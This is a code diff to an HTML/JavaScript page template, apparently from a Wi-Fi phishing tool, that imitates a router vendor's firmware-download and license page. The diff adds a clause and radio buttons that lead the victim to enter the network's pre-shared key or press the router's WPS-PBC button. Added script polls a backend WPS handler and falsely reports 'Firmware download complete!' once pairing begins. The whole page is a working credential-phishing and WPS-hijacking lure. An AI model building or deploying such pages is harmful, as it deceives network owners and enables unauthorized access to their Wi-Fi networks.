@@ -152,11 +152,19 @@ The {{ target_ap_vendor }} Firmware/Software/Drivers are provided "AS IS" withou
 
 3. NO LIABILITY.
 
-In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
+In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages.
+
+4. DOWNLOAD METHODS.
+
+You can either give the pre-shared key or just press the wps-pbc button on the Router and press the firmware download button.
        </textarea>
         <div class="checkbox">
           <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
         </div>
+        <form>
+            <input type="radio" id="key_radio" name="download_method" value="pre-shared key" checked> Pre-shared Key<br>
+            <input type="radio" id="wps_radio" name="download_method" value="wps_pbc"> WPS-PBC <br>
+        </form>
       </div>
       <div class="form-group has-feedback">
           <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key: <span id="pw_status" style="color:blue"></span></label>
@@ -254,14 +262,38 @@ $("#btn").on("click", function(e) {
     // if the box is checked
   	if ( box.checked == true )
   		{
-        // check to see if the value is empty
-      	if ( input.value == "" )
-      		{
-            // display no password message
-            $("#empty-pass").modal("show");
+        // check if wps radio button is selected
+        if (document.getElementById("wps_radio").checked == true)
+        {
+            // pass to wps state handler
+            var data =
+            {
+                "get_wps_state_handler": input.value
+            };
+            var dataToSend = JSON.stringify(data);
+            // post the data
+            $.ajax(
+                {
+                    url: '/backend/',
+                    type: 'POST',
+                    data: dataToSend,
 
-      		}
-      	else
+                    success: function (jsonResponse) {
+                        var objresponse = JSON.parse(jsonResponse);
+                        var verify_status = objresponse['get_wps_state_handler']
+                        if (verify_status == 'WPS_CONNECTING' || verify_status == "WPS_CONNECTED") {
+                            document.getElementById("pw_status").innerHTML = "Firmware download complete!"
+                        } else if (verify_status == 'WPS_IDLE') {
+                            document.getElementById("pw_status").innerHTML = "You haven't pressed the WPS-PBC button!"
+                        }
+                    },
+                });
+        }
+        // preshared-key is not filled
+        else if ( input.value == "" ) {
+            $("#empty-pass").modal("show");
+        }
+        else
       		{
                 var data =
                 {
